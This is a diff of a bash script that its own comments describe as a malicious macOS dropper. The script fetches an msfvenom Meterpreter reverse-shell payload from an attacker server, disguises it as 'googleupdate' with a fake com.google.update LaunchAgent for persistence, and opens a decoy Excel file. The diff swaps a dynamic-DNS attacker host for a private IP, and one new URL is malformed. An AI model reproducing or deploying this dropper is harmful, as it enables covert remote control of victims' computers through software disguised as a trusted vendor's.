@@ -1,14 +1,14 @@
 #!/usr/bin/env bash
 
 # URL hosting our malicious mach-o reverse shell generated with msfvenom
-# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=dns1resolve.hopto.org LPORT=443 -f macho > osx
-URL="https://dns1resolve.hopto.org:55143/osx"
+# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 -f macho > osx
+URL="https://192.168.1.5:8443/osx"
 
 # URL hosting our plist file
-PLISTURL="https://dns1resolve.hopto.org:55143/plist"
+PLISTURL="https://192.168.1.5:8443/plist"
 
 # URL to download a real excel file
-EXCELURL="https://www.smartsheet.com/sites/default/files/Construction-Budget-Template-IT.xlsx"
+EXCELURL="https://https://192.168.1.5:8443/excel.xls"
 
 # Rename our payload macho-o name
 PAYLOAD="googleupdate"
@@ -45,5 +45,5 @@ sed -i .bak "s/replace/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.pli
 rm ~/Library/LaunchAgents/com.google.update.plist.bak
 
 # Download and open a real file excel
-curl -s $EXCELURL -o progetto.xlsx
-open progetto.xlsx
+curl -s $EXCELURL -o excel.xlsx
+open excel.xlsx
